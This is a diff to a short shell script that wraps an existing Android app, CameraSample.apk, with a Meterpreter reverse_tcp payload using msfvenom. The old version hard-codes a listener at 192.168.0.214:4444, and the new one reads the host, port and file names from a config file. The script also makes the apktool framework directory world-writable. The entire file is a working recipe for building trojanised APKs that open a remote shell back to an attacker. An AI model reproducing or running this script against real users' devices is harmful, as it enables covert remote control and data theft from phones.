@@ -1,4 +1,10 @@
+#!/bin/sh
+
 sudo mkdir -p ~/.local/share/apktool/framework
 sudo chmod 777 ~/.local/share/apktool/framework
-sudo msfvenom -x CameraSample.apk -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > CameraSample_pen.apk
-sudo chmod +x CameraSample_pen.apk
+
+source config_payload.ini
+
+sudo msfvenom -x ${Original} -p android/meterpreter/reverse_tcp LHOST=${Listen_Host} LPORT=${Listen_Port} R > ${Payload}
+
+sudo chmod +x ${Payload}
